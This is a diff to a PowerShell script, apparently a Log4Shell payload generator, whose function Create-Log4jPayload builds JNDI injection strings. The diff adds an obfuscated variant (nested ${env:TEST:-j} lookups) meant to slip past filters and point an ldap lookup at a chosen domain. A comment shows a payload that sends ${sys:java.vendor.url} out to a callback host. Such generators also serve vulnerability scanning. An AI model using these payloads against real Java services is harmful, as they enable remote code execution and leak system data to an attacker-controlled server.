@@ -3,7 +3,6 @@
 # Todo: encoding, more command viations, protocol variations?
 # Notes: You can likely inject into RMI endpoints as well, is anyone looking for endpionts for known platforms exposed to the internet?
 # May need to add to the backend too: ${jndi:ldap:/callback.domain.com/${sys:java.vendor.url}} - just add the $MidPos2 to $EndPos; remove . and add /
-# this one is still pending - ${${env:TEST:-j}ndi${env:TEST:-:}${env:TEST:-l}dap${env:TEST:-:}//example.com}
 function Create-Log4jPayload
 (
     [Parameter(Position = 0)][System.String]$Domain,
@@ -88,6 +87,10 @@ function Create-Log4jPayload
             }      
         }       
     }
+
+    # add obfuscated version
+    $null = $PayloadVariations.Rows.Add("`${`${env:TEST:-j}ndi`${env:TEST:-:}`${env:TEST:-l}dap`${env:TEST:-:}//$Domain}")
+   
     $PayloadVariations
     $PayloadCount = $PayloadVariations.payload.Count
     Write-Verbose "$PayloadCount payloads were generated"
